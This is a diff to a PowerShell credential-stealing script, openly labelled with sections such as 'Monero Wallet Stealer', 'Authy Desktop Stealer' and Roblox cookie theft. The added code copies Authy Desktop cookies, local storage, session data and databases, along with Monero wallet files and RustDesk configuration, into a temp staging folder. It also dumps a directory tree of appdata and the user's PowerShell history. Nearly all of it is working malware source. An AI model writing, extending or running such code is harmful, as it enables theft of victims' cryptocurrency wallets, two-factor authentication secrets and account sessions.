@@ -83,8 +83,7 @@ if ($filezilla -ne $null) {
 }
 
 # RustDesk Config
-$rustdesk = Get-Childitem -Path $env:appdata\RuskDesk\config\ -Include RustDesk.toml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-if ($rustdesk -ne $null) {
+if ([System.IO.File]::Exists("$env:appdata\RuskDesk\config")) {
 	New-Item -Path $env:tmp/$FolderName/RustDesk -ItemType Directory
 	Copy-Item $env:appdata/RuskDesk/config $env:tmp/$FolderName/RustDesk/config -Recurse
 }
@@ -105,10 +104,20 @@ if ($qbt -ne $null) {
 
 # Monero Wallet Stealer
 $documents=[Environment]::GetFolderPath("MyDocuments")
-$monero = Get-Childitem -Path  "$documents\Monero\wallets" -Includes *.keys -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-if ($monero -ne $null) {
+if ([System.IO.File]::Exists("$documents\Monero\wallets")) {
 	New-Item -Path "$env:tmp/$FolderName/Monero" -ItemType Directory
 	Copy-Item "$documents\Monero\wallets" "$env:tmp/$FolderName/Monero/wallets" -Recurse
+}
+
+# Authy Desktop Stealer
+if ([System.IO.File]::Exists("$env:appdata\Authy Desktop")) {
+	New-Item -Path "$env:tmp/$FolderName/Authy" -ItemType Directory
+	Copy-Item "$documents\Authy Desktop\Cookies" "$env:tmp/$FolderName/Authy/Cookies"
+	Copy-Item "$documents\Authy Desktop\Local State" "$env:tmp/$FolderName/Authy/Local State"
+	Copy-Item "$documents\Authy Desktop\Preferences" "$env:tmp/$FolderName/Authy/Preferences"
+	Copy-Item "$documents\Authy Desktop\Local Storage\leveldb" "$env:tmp/$FolderName/Authy/Local Storage/leveldb" -Recurse
+	Copy-Item "$documents\Authy Desktop\Session Storage" "$env:tmp/$FolderName/Authy/Session Storage" -Recurse
+	Copy-Item "$documents\Authy Desktop\databases" "$env:tmp/$FolderName/Authy/databases" -Recurse
 }
 
 # Get Roblox Cookies
@@ -167,6 +176,7 @@ foreach($Drive in $drives) {
     $DriveName = $Drive.Replace(":\","")
     tree $Drive /a /f >> $env:TEMP\$folderName\Trees\tree-$DriveName.txt
 }
+tree $env:appdata /a /f >> $env:TEMP\$folderName\Trees\tree-appdata.txt
 
 # Powershell history
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
